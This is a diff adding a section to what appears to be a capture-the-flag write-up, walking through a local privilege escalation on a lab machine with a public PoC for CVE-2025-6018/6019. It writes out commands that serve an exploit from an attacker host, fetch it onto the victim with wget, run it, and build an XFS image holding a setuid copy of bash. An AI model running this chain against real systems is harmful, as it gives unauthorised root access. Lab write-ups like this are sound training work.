@@ -374,8 +374,53 @@ A search for related CVEs, resulted in finding the following CVE:
 
 <img src="Images/04-CVE-6019.png" width="400">
 
-Searching for related exploits returned the following proof of concept exploit:
+Searching for exploits returned the following PoC:
 
 <img src="Images/05-CVE-6018-6019.png" width="400">
 
+https://github.com/DesertDemons/CVE-2025-6018-6019
+
+Running the exploit requires following quite a few instructions. First we must prepare the exploit and transfer it over to the victim machine:
+
+#### Download exploit and prepare server:
+
+```
+git clone https://github.com/DesertDemons/CVE-2025-6018-6019.git
+cd CVE-2025-6018-6019/
+python3 -m http.server 9001
+```
+
+#### Transfer to victim:
+
+```
+wget 10.10.14.16:9001/exploit.sh
+chmod +x exploit.sh
+```
+
+#### Run exploit setup:
+
+```
+./exploit.sh --setup
+```
+
+Once we have run the setup, the PAM environment will be created.
+
+#### Run exploit --create-image:
+
+```
+./exploit.sh --create-image
+```
+
+Once we have run the create image script, we must log out of SSH, and run the following commands on the attacker machine:
+
+```
+scp phileasfogg3@pterodactyl.htb:/usr/bin/bash /tmp/bash
+dd if=/dev/zero of=xfs.img bs=1M count=300
+mkfs.xfs -f -m crc=0,reflink=0 xfs.img
+mkdir -p /tmp/mnt
+mount -o loop,suid xfs.img /tmp/mnt
+cp /tmp/bash /tmp/mnt/xpl
+chmod 4755 /tmp/mnt/xpl
+
+```
 
